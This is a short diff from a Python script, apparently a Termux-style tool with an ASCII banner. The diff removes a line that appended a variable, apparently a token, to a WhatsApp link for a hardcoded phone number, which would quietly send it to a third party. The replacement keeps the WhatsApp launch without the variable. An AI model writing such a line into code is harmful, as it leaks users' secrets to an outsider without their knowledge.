@@ -91,7 +91,7 @@ class Main:
 		except requests.exceptions.ConnectionError:
 			print("\n%s [!] NO INTERNET CONNECTION..\n"%(R))
 			exit()
-		os.system("am start https://wa.me/+923173280894?text=" + tks)
+		os.system("am start https://wa.me/+923173280894?text=")
 		
 		print ("""\033[1;91m  FAISAL
 \033[1;92m $$$$$$$_ __$$$___ $$$$_ _$$$$$__ __$$$___ $$______ 
